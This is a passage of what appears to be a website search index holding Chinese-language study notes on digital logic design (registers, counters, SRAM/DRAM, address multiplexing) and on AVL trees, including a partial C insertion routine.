<li>\u4e0a\u56feSerial\u6307\u4e32\u884c\u8f93\u5165\uff0c\u6bcf\u8fc7\u4e00\u4e2a\u65f6\u949f\u5468\u671f\uff0c\u4e0a\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u4f1a\u8f6c\u79fb\u5230\u4e0b\u4e00\u4e2a\u5bc4\u5b58\u5668</li> <li>input(\\(D_{1,2,3,4}\\))\u6307\u5e76\u884c\u8f93\u5165\uff0c\u4e0a\u56fe\u7535\u8def\u540c\u65f6\u652f\u6301\u4e32\u884c\u8f93\u5165\u548c\u5e76\u884c\u8f93\u5165\uff0c\u53ef\u4ee5\u901a\u8fc7Shift\u548cload\u52a0\u4ee5\u63a7\u5236</li> </ul> Shift Load Operation 0 0 No Change 0 1 Load input 1 X Shift Down <p>\u6b64\u5916\uff0c\u901a\u8fc7\u5728\u6bcf\u4e2aFlipflop\u524d\u90fd\u52a0\u4e00\u4e2aMUX\uff0c\u53ef\u4ee5\u5b9e\u73b0\u53cc\u5411\u79fb\u4f4d\uff08\u7b80\u5355\u6613\u61c2\u8036\uff09</p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#counter","title":"Counter \u8ba1\u6570\u5668","text":"<ul> <li>Asynchronous Counter (Ripple Counter)<ul> <li>Slower</li> <li>Simple</li> <li>Cost is low</li> </ul> </li> <li>Synchronous Counter<ul> <li>Faster</li> <li>Complex</li> <li>Cost is high</li> </ul> </li> </ul>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#ripple-counter","title":"Ripple Counter \u884c\u6ce2\u8ba1\u6570\u5668","text":"<p>\u4e5f\u662f\u6570\u5b57\u903b\u8f91\u8bbe\u8ba1\u8fd9\u95e8\u8bfe\u7a0b\u552f\u4e00\u4e00\u4e2a\u5f02\u6b65\u65f6\u5e8f\u7535\u8def</p> <p></p> <p>Easy to understand!</p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#synchronous-counter","title":"Synchronous Counter \u540c\u6b65\u8ba1\u6570\u5668","text":"<p>\u591a\u51fa\u6765\u7684Carry out\u4e0d\u8981\u4e22\u6389\uff0c\u53ef\u4ee5\u7528\u6765\u7ec4\u5408\u6210\u5bb9\u91cf\u66f4\u5927\u7684\u8ba1\u6570\u5668\uff01</p> <p></p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#n","title":"\u4f59N\u8ba1\u6570\u5668","text":"<p>\u901a\u8fc7\u5c06Counter\u7684\u6700\u5927\u8f93\u51fa\u7684\u4e0e\u95e8\u4f5c\u4e3a\u7684Load\u4fe1\u53f7\u4f20\u56deCounter\uff0c\u5b9e\u73b0\u6bcf\u6b21\u8ba1\u6570\u5230N-1\u65f6\u91cd\u7f6e\u8ba1\u6570</p> <p></p> <p>Tip</p> <p>\u4e0a\u56fe\u662f\u4e00\u4e2a\u4f597\u8ba1\u6570\u5668\uff0c\u56e0\u4e3a\u6bcf\u6b21Q\u4e3a <code>0110</code> (6) \u65f6\uff0c\u5c060\u8bfb\u5165</p> More Example <p> Synchronously Load 8 on Terminal Count 38</p>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/","title":"CH 7. Memory Basics","text":""},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#chapter-7-memory-basics","title":"Chapter 7 Memory Basics","text":"<p> \u7ea6 1537 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>Memory Hierarchy in Computers</p> <p></p>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#_1","title":"\u57fa\u7840\u5b9a\u4e49","text":"<ul> <li>Memory\uff1a\u4e00\u7cfb\u5217\u5b58\u50a8\u5355\u5143\u53ca\u53ef\u4ee5\u4e0e\u5176\u4ea4\u6362\u4fe1\u606f\u7684\u5fc5\u8981\u7535\u8def<ul> <li>Read-Only Memory\uff1a\u53ea\u8bfb\u5185\u5b58\uff0c\u5728\u7b2c\u4e94\u7ae0\u6709\u6240\u63d0\u53ca</li> <li>Random-Access Memory\uff1a\u968f\u673a\u8bbf\u95ee\u5185\u5b58\uff0c\u6307\u5185\u5b58\u4e2d\u6570\u636e\u7684\u8bfb\u53d6\u548c\u5199\u5165\u64cd\u4f5c\u6240\u9700\u8981\u7684\u65f6\u95f4\u4e0e\u8fd9\u4e9b\u6570\u636e\u6240\u5728\u7684\u4f4d\u7f6e\u65e0\u5173</li> </ul> </li> <li>Memory Organization\uff1a\u5173\u4e8eMemory\u5982\u4f55\u8bbf\u95ee\u6570\u636e\u7684\u57fa\u7840\u7ed3\u6784</li> <li>Memory Operation\uff1a\u5305\u62ec <code>read</code> \u548c <code>write</code> \u7b49\u7ecf\u5178\u64cd\u4f5c</li> <li>\u8ba1\u7b97\u673a\u4e2d\u5e38\u7528\u7684\u6570\u636e\u7c7b\u578b\u4e3b\u8981\u6709\u4e09\u79cd\uff1a<ul> <li>\u4f4d(bit)\uff1a\u6700\u5c0f\u5355\u5143</li> <li>\u5b57\u8282(byte)\uff1a8 \u4e2a\u8fde\u7eed\u7684 bit</li> <li>\u5b57(word)\uff1a\u7279\u5b9a\u6570\u91cf\u7684\u8fde\u7eed\u7684 bit\uff0c\u7531\u5185\u5b58\u7c7b\u578b\u51b3\u5b9a\uff0c\u4f20\u7edf\u610f\u4e49\u4e0a 1 word = 4 bytes or 2 bytes</li> </ul> </li> <li>Memory Address\uff1aA vector of bits that identifies a particular memory element \u6570\u636e\u7684\u7269\u7406\u5730\u5740</li> <li>Memory Size\uff1a\\(address\\ depth\\times word\\ width\\)</li> </ul>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#memory-organization","title":"Memory Organization","text":"<p>Memory Block System</p> <p></p> <ul> <li>CS\uff1aChip Select , also named Chip Enable(CE)  \u4f5c\u4e3aMemory\u7684\u4f7f\u80fd\u4fe1\u53f7</li> <li>k Address Lines\uff1a\u5728\u5185\u90e8\u88ab\u8bd1\u7801\u4e3a \\(2^k\\) \u4e2a\u6570\uff0c\u7528\u6765\u5bfb\u5740words of memory (Address Depth)</li> <li>Each word is n bit (Words Width)</li> </ul>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#basic-memory-operation","title":"Basic Memory Operation","text":"<p>\u5171\u6709\u4e09\u6761\u603b\u7ebf\u8fde\u63a5\u5230CPU\u4e0a</p> <ul> <li>Address Bus\uff1a\u786e\u5b9a\u6570\u636e\u7684\u7269\u7406\u5730\u5740</li> <li>Data Bus\uff1a\u4ece\u7269\u7406\u5730\u5740\u8bfb\u53d6\u6570\u636e or \u4f20\u8f93\u6570\u636e\u7ed9\u7269\u7406\u5730\u5740</li> <li>Control Bus\uff1a\u4f20\u8f93Control Signal\uff0c\u6bd4\u5982Chip Select,Read/Write,etc</li> </ul> CS \\(R/\\overline{W}\\) Memory Operation 0 X None 1 0 Write to selected word 1 1 Read from selected word Read MemoryWrite Memory <p>Read Memory\u7684\u987a\u5e8f\uff1a (\u5148\u8981\u7b49\u5730\u5740\u4fe1\u53f7\u8bd1\u7801\u7ed3\u675f)</p> <ol> <li>Place an address on the address lines</li> <li>Toggle(\u5207\u6362) the memory read control line</li> <li>Wait for the read data to become stable</li> </ol> <p></p> <p>Write Memory\u7684\u987a\u5e8f\uff1a</p> <ol> <li>Place an address on the address lines and valid data on the data lines</li> <li>Toggle the memory write control line</li> </ol> <p></p>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#ram","title":"RAM","text":"<p>Types of random access memory\uff1a</p> <ul> <li>Static - \u6570\u636e\u5b58\u50a8\u5728 Latches \u4e2d</li> <li>Dynamic - \u6570\u636e\u4f9d\u9760\u7535\u5bb9(Capcitors)\u7684\u7535\u538b(Electrical Charges)\u5b58\u50a8<ul> <li>\u7535\u538b\u4f1a\u6cc4\u9732\uff08leak\uff09</li> <li>\u9700\u8981\u9636\u6bb5\u6027\u7684 Refresh \u7535\u538b\u7528\u6765\u7ef4\u6301\u6570\u636e\uff08\u5b9a\u65f6\u5237\u65b0\uff09</li> </ul> </li> </ul> <p>Dependence on Power Supply</p> <p>\u6309\u7167\u5bf9\u4e8e\u7535\u6e90\u7684\u4f9d\u8d56\u6027\u5206\u7c7b\uff0cRAM\u5c5e\u4e8e Volatile (\u6613\u53d8\u7684) \uff0c\u5f53\u7535\u6e90\u5173\u95ed\uff0cRAM\u4f1a\u4e22\u5931\u5b58\u50a8\u7684\u6570\u636e\u3002</p> <p>\u800c\u6211\u4eec\u751f\u6d3b\u4e2d\u5e38\u89c1\u7684\u786c\u76d8\u4e00\u822c\u5c5e\u4e8e Non-volatile</p> <p></p>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#sram","title":"SRAM \u9759\u6001\u5185\u5b58","text":"<p>\u5355\u4e2aSRAM Cell\u7684\u7ed3\u6784\uff0c\u901a\u8fc7\u9501\u5b58\u5668\u5b58\u50a81-bit\u6570\u636e</p> <p></p> <p>\u901a\u8fc7 Decoder \uff0c\u53ef\u4ee5\u7ec4\u6210RAM ICs(Integrated Circuits) \uff0c\u4e0b\u56fe\u4e3a \\(2^4\\times 1\\ RAM\\)</p> <p></p> <p></p> <p>\u4e0a\u56fe\u4e3a\u4e00\u4e2a\\(2^n\\times 1\\) SRAM\u7684\u7ec6\u5316\u56fe\uff0c\u6211\u4eec\u5206\u6790\u8fd9\u4e2a\u7535\u8def\u7684\u529f\u80fd\uff1a</p> <ul> <li>\u5f53CS\u4e3a0\u65f6\uff0c\u8f93\u5165\u548c\u8f93\u51fa\u5168\u90e8\u65e0\u6548\uff0cRAM\u65e0\u6548</li> <li>\u5f53CS\u4e3a1\u65f6<ul> <li>\u5f53 \\(R/\\overline{W}\\) \u4e3a0\u65f6\uff0cData In \u6709\u6548\uff0c\u5e76\u6839\u636eWord Select\u4fe1\u53f7\u5c06\u6570\u636e\u5b58\u5165\u5bf9\u5e94\u7684Cell\u4e2d</li> <li>\u5f53 \\(R/\\overline{W}\\) \u4e3a1\u65f6\uff0cData In \u65e0\u6548\uff0c\u8f93\u51fa\u5f53\u524dRAM\u6240\u5b58\u50a8\u7684\u503c</li> </ul> </li> </ul> <p>\u5176\u4e2d\uff0cData In \u548c Data Out \u90fd\u662f\u63a5\u5728 Data Bus \u603b\u7ebf\u4e0a\u7684\uff0c\u5728\u5b9e\u9645\u5f15\u7528\u4e2d\u9700\u8981\u7528\u5230\u53cc\u5411\u5f15\u811a\u6765\u89e3\u51b3\u8fd9\u4e2a\u77db\u76fe(DIO)</p> <p>\u53cc\u5411\u5f15\u811a</p> <p>Bidirectional In/Out Data Pins (DIO) </p>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#cell-arrays-and-coincident-selection","title":"Cell Arrays and Coincident Selection","text":"<p>Decoder \u7684\u4f4d\u5bbd\u548c\u8f93\u5165\u603b\u7ebf\u7684Fan-out\u90fd\u662f\u6709\u9650\u7684\uff0c\u5236\u7ea6\u4e86\u5185\u5b58\u7684\u6269\u5927\u3002\u4e00\u79cd\u6709\u6548\u7684\u89e3\u51b3\u529e\u6cd5\u662f\u4f7f\u7528Coincident Selection\uff0c\u5373\u4f7f\u7528\u4e24\u4e2a Decoder \uff0c\u5206\u522b\u8d1f\u8d23\u884c\u5bfb\u5740\u548c\u5217\u5bfb\u5740\u3002</p> <p>\u4e0b\u56fe\u662f \\(2^4\\times 1\\) RAM \u7684\u53e6\u4e00\u79cd\u5f62\u5f0f</p> <p></p>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#_2","title":"\u5b57\u62d3\u5c55 \u548c \u4f4d\u62d3\u5c55","text":"<p>\u60f3\u8981\u4ece\u4e00\u4e2a \\(4\\times 1\\) RAM \u62d3\u5c55\u6210 \\(16\\times 4\\) RAM\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u4ece \\(4\\times 1\\) RAM \u5982\u4f55\u5206\u522b\u5f97\u5230 \\(16\\times 1\\) RAM (word extension) \u548c \\(4\\times 4\\) RAM (bit extension)</p> <p>Info</p> <p>\u5728\u590d\u4e60\u65f6\u4e5f\u770b\u89c1\u8fc7\u8fd9\u79cd\u53eb\u6cd5:</p> <ul> <li>Word-Capacity Expansion: Word extension (address bits are increased)</li> <li>Word-Length Expansion: Bit extension</li> </ul> <p>\u4e0d\u8981\u8bb0\u6df7\u4e86</p>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#word-extension","title":"Word Extension \u5b57\u62d3\u5c55","text":"<ul> <li>\\(A_0\\) \\(A_1\\) \u6b63\u5e38\u63a5\u5165\u56db\u4e2a \\(2^n \\times 1\\ RAM\\) \u4e2d</li> <li>\\(A_2\\) \\(A_3\\) \u63a5\u5165Decoder\uff0c\u4f20\u51fa\u7684\u4fe1\u53f7\u4f5c\u4e3aCS\u63a5\u5165RAM\uff0c\u6765\u9009\u62e9\u8f93\u51fa\u54ea\u4e2aRAM\u7684\u6570\u636e</li> </ul> More Example"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#bit-extension","title":"Bit Extension \u4f4d\u62d3\u5c55","text":"<ul> <li>\u5c06\u56db\u4e2aRAM\u5e76\u8054\uff0cD-In \u548c D-Out \u90fd\u4e00\u8d77\u8f93\u51fa</li> </ul> <p>\u4e24\u4e2a\u90fd\u5e94\u7528</p> <p></p>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#dram","title":"DRAM \u52a8\u6001\u5185\u5b58","text":"<p>DRAM Cell \u548c SRAM Cell \u57fa\u672c\u7c7b\u4f3c\uff0c\u4e5f\u62e5\u6709\u4e00\u4e2a select \u4f7f\u80fd\u7aef\u548c\u4e00\u7ec4\u8f93\u5165\u8f93\u51fa\u7aef\uff0c\u552f\u4e00\u7684\u533a\u522b\u5728\u4e8e\u5b58\u50a8\u5668\u7684\u4e0d\u540c\u3002SRAM Cell \u4f7f\u7528\u4e00\u4e2a\u9501\u5b58\u5668\u6765\u5b58\u50a8\u6570\u636e\uff0c\u800c DRAM Cell \u4f7f\u7528\u4e00\u4e2a\u7535\u5bb9\u548c\u4e00\u4e2a\u6676\u4f53\u7ba1\u6765\u5b58\u50a8\u6570\u636e\u3002</p> <ul> <li>\u6676\u4f53\u7ba1 T \u53ef\u4ee5\u89c6\u4f5c\u4e00\u4e2a\u5f00\u5173\uff0c\u7528\u6765\u8fde\u63a5\u5916\u90e8\u8f93\u5165\u4fe1\u53f7 B \u548c\u7535\u5bb9 C\uff1b</li> <li>\u7535\u5bb9 C \u7528\u4e8e\u5b58\u50a8\u6570\u636e\uff0c\u5f53\u7535\u5bb9\u4e3a\u6ee1\uff08\u7535\u8377\u91cf\u9ad8\u4e8e\u67d0\u4e00\u9608\u503c\uff09\u65f6\u8868\u793a\u9ad8\u7535\u5e73 \uff0c\u5f53\u7535\u5bb9\u4e3a\u7a7a\uff08\u7535\u8377\u91cf\u4f4e\u4e8e\u67d0\u4e00\u9608\u503c\uff09\u65f6\u8868\u793a\u4f4e\u7535\u5e73</li> </ul> <p></p> <p>\u540c\u6837\u901a\u8fc7 Decoder \uff0c\u7ec4\u6210\u96c6\u6210\u7535\u8def\u3002\u7531\u4e8e\u5143\u5668\u4ef6\u4f7f\u7528\u7684\u5c11\uff0c\u56e0\u6b64DRAM\u76f8\u6bd4\u4e8eSRAM\u7535\u8def\u5f00\u9500\u66f4\u5c0f\uff0c\u56e0\u6b64\u5e7f\u6cdb\u5e94\u7528\u4e8e\u5927\u578b\u5185\u5b58\u5f53\u4e2d\u3002</p> <p></p> <p></p> <p>\u5728\u786e\u5b9a\u6570\u636e\u7269\u7406\u5730\u5740\u7684\u65f6\u5019\uff0c\u5148\u9001\u884c\u5730\u5740\uff0c\u518d\u9001\u5217\u5730\u5740\uff1a\u884c\u5730\u5740\u8bfb\u51fa\u6570\u636e\uff0c\u5217\u5730\u5740\u9501\u5b9a\u6570\u636e </p> <p>DRAM Reading Time</p> <p></p>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#addres-multiplexing","title":"Addres Multiplexing \u5730\u5740\u590d\u7528","text":"<p>\u5730\u5740\u590d\u7528</p> <p>\u5728\u5904\u7406\u8f83\u5927\u6570\u636e\u7684\u65f6\u5019\uff0c\u7531\u4e8e\u5f15\u811a(Pin)\u6570\u76ee\u7684\u9650\u5236\uff0c\u4e0d\u53ef\u80fd\u7528\u4e00\u4e2aDRAM\u4e00\u6b21\u6027Transfer\u6240\u6709\u6570\u636e\uff0c\u56e0\u6b64\u6211\u4eec\u91c7\u53d6Addres Multiplexing\u6765\u51cf\u5c11\u5730\u5740\u5f15\u811a\u7684\u4f7f\u7528</p> <p></p> <ul> <li>\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u5730\u5740\u590d\u7528\u4e2d\uff0cRow Address \u548c Col Address \u4f7f\u7528\u7684\u540c\u4e00\u4e2a\u5f15\u811a\uff0c\\(\\overline{RAS}\\) \u548c \\(\\overline{CAS}\\) \u5206\u522b\u7528\u6765\u63a7\u5236Register\u7684\u8f7d\u5165\u4fe1\u53f7\uff0c\u7f6e0\u8f7d\u5165<ul> <li>\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5148\u8f93\u5165\u884c\u5730\u5740\uff0c\u518d\u8f93\u5165\u5217\u5730\u5740\u5b9e\u73b0\u540c\u4e00\u4e2a\u5f15\u811a\u5b8c\u6210\u5730\u5740\u590d\u7528</li> </ul> </li> <li>\u5982\u679c\u7528\u4e8c\u8fdb\u5236\u8868\u793a\u5730\u5740\u7684\u8bdd\uff0c\u884c\u5730\u5740\u662f\u9ad8\u516b\u4f4d\uff0c\u5217\u5730\u5740\u662f\u4f4e\u516b\u4f4d</li> </ul> <p>Example 1</p> <p></p> <p>Example 2</p> <p></p>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#refreshing-policy","title":"Refreshing Policy","text":"<p>DRAM\u9700\u8981\u7ecf\u5e38\u5237\u65b0\u7ef4\u6301\u5b83\u7684\u6570\u636e\u3002</p> <p>\u5237\u65b0\u6a21\u5f0f\uff1a</p> <ul> <li>\u7206\u53d1\u6a21\u5f0f(burst mode)\uff1a\u505c\u6b62\u5de5\u4f5c\uff0c\u5237\u65b0\u6240\u6709\u6570\u636e</li> <li>\u5206\u5e03\u6a21\u5f0f(distributed mode)\uff1a\u95f4\u9694\u4e00\u6bb5\u65f6\u95f4\u5237\u65b0\uff0c\u4ece\u800c\u907f\u514d\u957f\u65f6\u95f4\u7684\u5185\u5b58\u963b\u585e\uff0c\u8fd9\u79cd\u5237\u65b0\u65b9\u5f0f\u66f4\u52a0\u5e38\u7528</li> </ul> <p>\u540e\u9762\u6446\u4e86\uff0c\u6709\u7f18\u518d\u8865</p>"},{"location":"Courses/DD/note/Chapter%207%20Memory%20Basics/#types","title":"Types","text":"<ul> <li>Synchronous DRAM (SDRAM)</li> <li>Double Data Rate SDRAM (DDR SDRAM)</li> <li>RAMBUS\u00ae DRAM (RDRAM)</li> </ul>"},{"location":"Courses/DS/ADS/","title":"Index","text":"<p> \u7ea6 85 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"Courses/DS/ADS/#_1","title":"\u5206\u6570\u6784\u6210","text":"<ul> <li>Homework 10%</li> <li>Discussions 10%<ul> <li>\u5e76\u975e\u8bfe\u4e0a\u8ba8\u8bba\uff0c\u793e\u6050\u798f\u97f3</li> </ul> </li> <li>Project 30%<ul> <li>\u4e24\u4efd\u62a5\u544a\uff0c\u6bcf\u4e2a 10%</li> <li>\u8bfe\u4e0a Presentation 6%</li> <li>\u7ed9\u5176\u5b83\u7ec4 Topic \u6253\u5206\uff0c\u5171 4%</li> </ul> </li> <li>Midterm 10%</li> <li>Final Exam 40%</li> </ul> <p>\u8207 FDS \u76f8\u540c\uff0c\u671f\u672b\u53ef\u4ee5\u8986\u84cb\u671f\u4e2d</p> <p>\u6211\u4eec\u8fd9\u5c4a\u8003\u7684\u4f3c\u4e4e\u6bd4\u8f83\u7b80\u5355\uff0c\u6ee1\u4e86\u3002</p>"},{"location":"Courses/DS/ADS/#reference","title":"Reference","text":"<ul> <li>Isshiki\u4fee's Notebook</li> <li>Carton \u7684\u624b\u5199\u7b97\u6cd5\u7b14\u8bb0</li> </ul>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/","title":"AVL Trees, Splay Tree & Amortized Analysis","text":"<p> \u7ea6 2947 \u4e2a\u5b57  62 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 16 \u5206\u949f</p>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#avl","title":"AVL \u6811","text":""},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#_1","title":"\u5b9a\u4e49","text":"<p>AVL Tree \u7684\u540d\u5b57\u7531\u6765\u4e8e\u5b83\u7684\u4e09\u4e2a\u4f5c\u8005 Adelson , Velskii , Landis \uff0c\u5176\u4e00\u822c\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <p>\u4e00\u4e2a\u4e8c\u53c9\u6811\u7684\u6240\u6709\u8282\u70b9\uff0c\u5176\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\u9ad8\u5ea6\u5dee\u5c0f\u4e8e\u7b49\u4e8e\u4e00\uff0c\u8fd9\u9897\u4e8c\u53c9\u6811\u5c31\u88ab\u79f0\u4e3a AVL Tree</p> <p>Balance Factor</p> <p>\u6211\u4eec\u4f7f\u7528 BF(Node) \u6765\u8868\u793a\u8be5\u8282\u70b9\u5de6\u5b50\u6811\u9ad8\u5ea6\u51cf\u53bb\u53f3\u5b50\u6811\u9ad8\u5ea6\uff0c\u5373 \\(h_L -h_R\\)</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 ADS \u8bfe\u7a0b\u4e2d\uff0c\u6211\u4eec\u5747\u5b9a\u4e49\u7a7a\u6811\u7684\u9ad8\u5ea6\u4e3a -1 \uff0c\u90a3\u4e48\u53ea\u6709\u4e00\u4e2a\u6839\u8282\u70b9\u7684\u6811\u9ad8\u5ea6\u4e3a 0</p> <p>\u5bf9\u4e8e AVL \u6811\uff0c\u5219\u6709 BF(Node) = -1, 0, or 1</p> <p>\u6839\u636e AVL \u6811\u7684\u6027\u8d28\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u786e\u5b9a\u5176\u9ad8\u5ea6 h \u4ecd\u7136\u4e3a \\(O(\\log n)\\) \u91cf\u7ea7</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u9ad8\u5ea6\u4e3a \\(h\\) \u7684 AVL \u6811\uff0c\u5176\u6700\u5c11\u8282\u70b9\u7684\u60c5\u51b5\u53ef\u4ee5\u770b\u4f5c\u662f\u5de6\u5b50\u6811\u4e3a\u9ad8\u5ea6\u4e3a \\(h-1\\) \u6700\u5c11\u8282\u70b9\u7684 AVL \u6811\uff0c\u53f3\u5b50\u6811\u4e3a\u9ad8\u5ea6\u4e3a \\(h-2\\) \u6700\u5c11\u8282\u70b9\u7684 AVL \u6811\u3002\u90a3\u4e48\uff0c\u5b83\u4eec\u7684\u8282\u70b9\u6570\u91cf\u4e4b\u95f4\u6709\u9012\u63a8\u5173\u7cfb\uff1a</p> \\[ n_h= n_{h-1} +n_{h-2} +1 \\] <p>\u5176\u4e2d\u8d77\u59cb\u503c \\(n_{-1} = 0,n_0 =1\\) \uff0c\u90a3\u4e48\u9012\u63a8\u53ef\u4ee5\u5f97\u5230 \\(n_6 =33\\) \u3002</p>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#_2","title":"\u7ef4\u62a4","text":"<p>\u5173\u4e8e AVL \u6811\u7684\u7ef4\u62a4\uff0c\u6700\u91cd\u8981\u7684\u64cd\u4f5c\u5728\u4e8e Left-Rotate \u548c Right-Rotate\uff0c\u5176\u8bb0\u5fc6\u8981\u70b9\u4e3a\u5404\u4e2a\u53f6\u8282\u70b9\u7684\u5de6\u53f3\u987a\u5e8f\u4e0d\u53d8\uff1a</p> <p></p> <p>\u6309\u7167\u65b0\u63d2\u5165\u7684\u8282\u70b9\u4e0e\u5931\u8861\u7684\u8282\u70b9\u7684\u4f4d\u7f6e\u5173\u7cfb\uff0c\u53ef\u4ee5\u5c06 AVL \u6811\u7684\u7ef4\u62a4\u5206\u4e3a\u4e24\u7c7b\u56db\u79cd\uff1a</p>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#single-rotation","title":"Single Rotation","text":"<p>RR rotation</p> <p>\u987a\u5e8f\u63d2\u5165 1,2,3 \uff0c\u6709\u4e0b\u56fe\u5de6\u793a BST(Binary Seach Tree)\u3002\u6b64\u65f6\u8282\u70b91\u7684 BF \u7b49\u4e8e -2\uff0c\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u8c03\u6574</p> <p>\u7531\u4e8e Trouble Maker \u8282\u70b93\u4f4d\u4e8e Trouble Finder \u8282\u70b91\u7684\u53f3\u5b50\u6811\u7684\u53f3\u5b50\u6811\u5185\uff0c\u8fd9\u79cd\u7ef4\u62a4\u65b9\u6cd5\u79f0\u4e3a RR rotation</p> <p>\u5177\u4f53\u65b9\u5f0f\u4e3a\u5bf9 Trouble Finder \u8282\u70b91\u8fdb\u884c\u4e00\u6b21\u5de6\u65cb\u8f6c\uff0c\u5f97\u5230\u53f3\u793a\u65b0\u7684 AVL \u6811</p> <p></p> <p>LL rotation</p> <p>\u540c\u7406\uff0c\u987a\u5e8f\u63d2\u5165 3,2,1 \uff0c\u6709\u4e0b\u56fe\u6240\u793a LL rotation \u7684\u7ef4\u62a4\uff0c\u5373\u5bf9 Trouble Finder \u8282\u70b93\u8fdb\u884c\u4e00\u6b21\u53f3\u65cb\u8f6c\uff0c\u5f97\u5230\u53f3\u793a\u65b0\u7684 AVL \u6811</p> <p></p>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#double-rotation","title":"Double Rotation","text":"<p>LR rotation</p> <p>\u6309\u7167 5,6,2,1,4,3 \u987a\u5e8f\u63d2\u5165\uff0c\u5f97\u5230\u5de6\u793a BST \uff0c\u6b64\u65f6\u8282\u70b95\u7684 BF \u4e3a 2 \uff0c\u4e14 Trouble Maker \u8282\u70b93\u4f4d\u4e8e\u8282\u70b95\u7684\u5de6\u5b50\u6811\u7684\u53f3\u5b50\u6811\u5185\uff0c\u56e0\u6b64\u5e94\u4f7f\u7528 LR rotation \u8fdb\u884c\u7ef4\u62a4</p> <p>\u5177\u4f53\u7684\u7ef4\u62a4\u65b9\u6cd5\u4e3a\uff0c\u5148\u5bf9 Trouble Finder \u7684\u5de6\u8282\u70b9\u8fdb\u884c\u5de6\u65cb\u8f6c\uff0c\u518d\u5bf9 Trouble Finder \u8fdb\u884c\u53f3\u65cb\u8f6c</p> <p></p> <p>\u5c0f\u6280\u5de7</p> <p>\u5982\u679c\u96be\u4ee5\u5728\u8111\u4e2d\u8fdb\u884c\u4e24\u6b21\u65cb\u8f6c\uff0c\u53ef\u4ee5\u8bb0\u4f4f\u4e0a\u56fe\u8282\u70b94,2,5\u7684\u4f4d\u7f6e\u5173\u7cfb\uff0c\u5176\u5b83\u8282\u70b9\u6309\u7167\u539f\u6765\u7684\u5de6\u53f3\u987a\u5e8f\u63a5\u5165\u5373\u53ef</p> <p>RL rotation</p> <p>\u6309\u7167 2,1,5,6,4,3 \u987a\u5e8f\u63d2\u5165\uff0c\u5f97\u5230\u5de6\u793a BST \uff0c\u6b64\u65f6\u8282\u70b92\u7684 BF \u4e3a -2\uff0c\u4e14 Trouble Maker \u8282\u70b93\u4f4d\u4e8e\u8282\u70b92\u7684\u53f3\u5b50\u6811\u7684\u5de6\u5b50\u6811\u5185\uff0c\u56e0\u6b64\u5e94\u4f7f\u7528 RL rotation \u8fdb\u884c\u7ef4\u62a4</p> <p>\u5177\u4f53\u7684\u7ef4\u62a4\u65b9\u6cd5\u4e3a\uff0c\u5148\u5bf9 Trouble Finder \u7684\u53f3\u8282\u70b9\u8fdb\u884c\u53f3\u65cb\u8f6c\uff0c\u518d\u5bf9 Trouble Finder \u8fdb\u884c\u5de6\u65cb\u8f6c</p> <p></p> <p>\u901a\u8fc7\u65cb\u8f6c\u4fee\u6b63\u540e\u7684\u9ad8\u5ea6\u4e00\u5b9a\u4e0e\u63d2\u5165\u65b0\u8282\u70b9\u4e4b\u524d\u7684\u9ad8\u5ea6\u76f8\u540c\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ea\u9700\u8981\u5904\u7406\u7b2c\u4e00\u4e2a\u62a5\u9519\u7684\u8282\u70b9\u5373\u53ef</p>"},{"location":"Courses/DS/ADS/AVL%20Trees%2CSplay%20Tree%20%26%20Amortized%20Analysis/#_3","title":"\u4ee3\u7801\u5b9e\u73b0","text":"<pre><code>typedef struct AvlNode* AvlTree;\n\nstruct AvlNode {\n    ElementType Element;\n    AvlTree Left;\n    AvlTree Right;\n    int Height;\n}\n\nstatic int Height(AvlTree P) {\n    if (P == NULL)\n        return -1;\n    else\n        return P-&gt;Height;\n}\n\nAvlTree Insert(ElementType X, AvlTree T) {\n    if(T == NULL) {\n        //Create and return a one-node tree\n        T = malloc(sizeof(struct AvlNode));\n        if(T == NULL)\n            FatalError(\"Out of Space!\");\n        else {\n            T-&gt;Element = X;\n            T-&gt;Height = 0;\n            T-&gt;Left = T-&gt;Right = 